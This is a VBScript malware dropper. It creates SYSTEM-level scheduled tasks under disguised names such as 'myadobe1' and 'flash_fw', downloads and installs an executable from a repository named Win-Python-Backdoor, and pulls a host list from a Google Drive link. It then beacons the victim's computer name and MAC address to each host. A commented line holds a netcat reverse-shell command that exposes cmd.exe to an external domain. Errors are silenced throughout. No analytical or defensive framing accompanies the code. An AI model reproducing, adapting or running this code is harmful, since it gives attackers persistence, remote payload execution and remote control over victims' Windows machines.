On Error Resume Next
Set oShell = CreateObject ("WScript.Shell") 
windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
oShell.run "schtasks /delete /tn sys /F"
oShell.run "schtasks /delete /tn syskill /F"
oShell.run "schtasks /delete /tn office_get /F"
oShell.run "schtasks /create /tn office_get /xml " & windir & "\office_get.xml /F"
oShell.run "schtasks /create /ru 'SYSTEM' /sc minute /mo 1 /tr " & windir & "\woffice.exe /tn myadobe1 /rl highest /F"
oShell.run "schtasks /create /ru 'SYSTEM' /sc minute /mo 1 /tr 'C:\Program Files\Windows Defender\NisSrv.exe' /tn flash_fw /rl highest /F"
oShell.run "schtasks /create /ru 'SYSTEM' /sc minute /mo 5 /tr 'taskkill /f /im woffice.exe' /tn myflash /rl highest /F"
dim urlgit
urlgit="https://github.com/pistacchietto/Win-Python-Backdoor/raw/master"
call Download(urlgit & "/woffice.exe", windir & "\woffice.exe")
set xmlhttp = createobject ("Msxml2.ServerXMLHTTP")
dim url,mac
  'url="https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/"
  url="https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF"
'msgbox  url&"site.txt"
'xmlhttp.open "get", url&"site.txt", false

xmlhttp.open "get", url, false
xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"  
xmlhttp.send
strOutput = xmlhttp.responseText
a=Split(strOutput,",")

Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputerName & "\root\cimv2")

Set colAdapters = objWMIService.ExecQuery _
    ("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
for each nad in colAdapters
    If Not IsNull(Nad.DefaultIPGateway) Then
      if not isnull(Nad.MACAddress) then mac=Nad.MACAddress 'Wscript.Echo Nad.description, Nad.MACAddress 
    end if  
next 


dim arr
  for each x in a
      'msgbox x
      'nc64.exe -w 10 -e cmd.exe config02.addns.org 4002
      'Wscript.Echo "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac
      
      xmlhttp.open "get", "http://"&x&"/svc/wup.php?pc=pdf_"&strComputerName&"_"&mac, false
      xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"  
      xmlhttp.send
      
      
        
      
      WScript.Sleep 100
      
  next
sub Download(myURL, myPath)
dim xHttp: Set xHttp = createobject("Msxml2.ServerXMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", myURL, False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile myPath, 2 '//overwrite
end with

end sub